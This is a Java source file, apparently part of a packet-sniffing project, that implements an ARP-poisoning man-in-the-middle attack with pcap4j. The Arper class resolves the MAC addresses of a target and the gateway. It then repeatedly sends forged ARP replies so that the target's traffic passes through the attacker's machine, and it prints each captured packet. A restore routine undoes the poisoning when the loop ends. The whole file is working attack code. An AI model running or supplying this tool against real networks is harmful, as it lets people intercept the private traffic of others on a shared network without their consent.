package com.pkt.sniff;

import org.pcap4j.util.MacAddress;

import com.pkt.sniff.packets.ARP;
import com.pkt.sniff.packets.EthernetFrame;
import com.pkt.sniff.utils.NetworkUtils;
import com.pkt.sniff.utils.Utils;

import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapPacket;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.ArpPacket.Builder;
import org.pcap4j.packet.namednumber.EtherType;

public class Arper {
    private String attackerIP;
    private String gatewayIP;
    private String targetIP;
    private MacAddress attackerMac;
    private MacAddress gatewayMac;
    private MacAddress targetMac;
    private PcapNetworkInterface nif;

    public Arper(String targetIP, String gatewayIP) {
        configure(targetIP, gatewayIP);
    }

    public Arper(String attackerIP, MacAddress attackerMac, MacAddress targetMac, MacAddress gatewayMac) {
        this.attackerIP = attackerIP;
        this.attackerMac = attackerMac;
        this.targetMac = targetMac;
        this.gatewayMac = gatewayMac;
    }

    public void run() {

        summary();

        Sniff sniff = new Sniff(nif);
        sniff.setFilter("dst host " + targetIP);

        System.out.println("Running...");
        Utils.sleep(2000);

        while (true) {
            try {
                poison(gatewayIP, targetIP);

                Packet p = sniff.capturePacket();
                System.out.println(p);
            } catch (Exception e) {
                e.printStackTrace();
                break;
            }

        }

        sniff.closeHandle();
        System.out.println("Restoring...\n");
        restore(gatewayIP, targetIP);

    }

    private void poison(String gatewayIP, String targetIP) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);

            EthernetPacket victim = buildArpPacket(gatewayIP, attackerMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, attackerMac, gatewayIP, gatewayMac);

            handle.sendPacket(gateway);
            handle.sendPacket(victim);
            handle.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void restore(String gatewayIP, String targetIP) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);

            EthernetPacket victim = buildArpPacket(gatewayIP, gatewayMac, targetIP, targetMac);
            EthernetPacket gateway = buildArpPacket(targetIP, targetMac, gatewayIP, gatewayMac);

            handle.sendPacket(gateway);
            handle.sendPacket(victim);
            handle.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void configure(String targetIP, String gatewayIP) {
        this.nif = NetworkUtils.selectNetWorkInterface();
        this.attackerIP = nif.getAddresses().get(0).getAddress().getHostAddress();
        this.attackerMac = MacAddress.getByAddress(nif.getLinkLayerAddresses().get(0).getAddress());
        this.targetIP = targetIP;
        this.targetMac = getMac(targetIP);
        this.gatewayIP = gatewayIP;
        this.gatewayMac = getMac(gatewayIP);
    }

    private MacAddress getMac(String ipAddr) {
        PcapHandle handle;
        try {
            handle = NetworkUtils.createPcapHandle(attackerIP);
            handle.setFilter("arp and src host " + ipAddr,
                    BpfCompileMode.OPTIMIZE);

            EthernetPacket arpPckt = buildArpPacket(
                    attackerIP,
                    attackerMac,
                    ipAddr,
                    MacAddress.ETHER_BROADCAST_ADDRESS);

            handle.sendPacket(arpPckt);
            Utils.sleep(1000);

            PcapPacket frame = handle.getNextPacketEx();
            handle.close();

            MacAddress srcHardwareAddr = frame
                    .getPacket()
                    .get(EthernetPacket.class)
                    .getHeader()
                    .getSrcAddr();

            return srcHardwareAddr;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }

    }

    private EthernetPacket buildArpPacket(String srcIP, MacAddress srcMac, String dstIP, MacAddress dstMac) {
        ARP arp = new ARP(srcIP, dstIP, srcMac, dstMac);
        Builder linkLayerPayload = arp.getPacket();

        EthernetFrame frame = new EthernetFrame(srcMac, dstMac, linkLayerPayload, EtherType.ARP);
        EthernetPacket packet = frame.getFrame().build();

        return packet;
    }

    private void summary() {
        System.out.println("Summary: ");
        System.out.printf("src HAddr: %s", this.attackerMac);
        System.out.println();
        System.out.printf("src IP: %s", this.attackerIP);
        System.out.println();
        System.out.printf("gateway HAddr: %s", this.gatewayMac);
        System.out.println();
        System.out.printf("gateway IP: %s", this.gatewayIP);
        System.out.println();
        System.out.printf("target HAddr: %s", this.targetMac);
        System.out.println();
        System.out.printf("target IP: %s", this.targetIP);
        System.out.println();
    }

}
